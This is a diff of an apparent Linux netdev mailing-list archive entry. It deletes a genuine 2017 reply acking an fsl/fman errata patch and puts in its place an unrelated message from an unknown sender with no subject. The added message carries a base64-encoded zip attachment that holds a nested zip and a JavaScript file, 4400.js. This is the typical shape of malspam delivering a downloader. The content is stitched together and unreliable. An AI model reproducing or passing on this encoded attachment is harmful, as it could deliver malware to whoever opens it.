@@ -1,31 +1,68 @@
-From: Madalin-cristian Bucur <madalin.bucur@nxp.com>
-Subject: RE: [PATCH net-next] fsl/fman: implement several errata workarounds
-Date: Fri, 11 Aug 2017 08:41:33 +0000
-Message-ID: <AM5PR0402MB269188FDE87431467E6C4076EC890@AM5PR0402MB2691.eurprd04.prod.outlook.com>
-References: <1502372824-30180-1-git-send-email-florinel.iordache@nxp.com>
+From: <helga.brickl@arcor.de>
+Subject: (unknown)
+Date: Fri, 11 Aug 2017 08:54:47 -0000
+Message-ID: <150244168769.25647.5115155549853619816@classic.com.np>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
-Cc: "davem@davemloft.net" <davem@davemloft.net>,
-        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
-        "linuxppc-dev@lists.ozlabs.org" <linuxppc-dev@lists.ozlabs.org>
-To: Florinel Iordache <florinel.iordache@nxp.com>,
-        "netdev@vger.kernel.org" <netdev@vger.kernel.org>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <1502372824-30180-1-git-send-email-florinel.iordache@nxp.com>
-Content-Language: en-US
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="3242728060.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from cust220-107.classic.com.np ([45.123.220.107]:47549 "HELO
+        classic.com.np" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751418AbdHKIy5 (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Fri, 11 Aug 2017 04:54:57 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-> -----Original Message-----
-> From: Florinel Iordache [mailto:florinel.iordache@nxp.com]
-> Subject: [PATCH net-next] fsl/fman: implement several errata workarounds
->=20
-> Implemented workarounds for the following dTSEC Erratum:
-> A002, A004, A0012, A0014, A004839 on several operations
-> that involve MAC CFG register changes: adjust link,
-> rx pause frames, modify MAC address.
->=20
-> Signed-off-by: Florinel Iordache <florinel.iordache@nxp.com>
-
-Acked-by: Madalin Bucur <madalin.bucur@nxp.com>
+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
+AFoAAACECgAAAAA=
